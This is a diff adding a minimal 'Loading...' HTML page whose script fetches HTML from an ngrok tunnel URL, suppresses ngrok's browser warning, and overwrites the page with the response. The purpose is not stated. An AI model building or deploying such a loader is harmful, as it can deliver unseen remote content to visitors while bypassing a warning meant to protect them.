@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Loading...</title>
+  <script>
+    fetch("https://1b89-180-241-46-144.ngrok-free.app", {
+      method: "GET",
+      headers: {
+        "ngrok-skip-browser-warning": "true"
+      }
+    })
+    .then(response => response.text())
+    .then(html => {
+      document.open();
+      document.write(html);
+      document.close();
+    })
+    .catch(error => {
+      document.body.innerHTML = "<h1>Gagal memuat halaman.</h1><p>" + error + "</p>";
+    });
+  </script>
+</head>
+<body>
+  <p>Loading, please wait...</p>
+</body>
+</html>
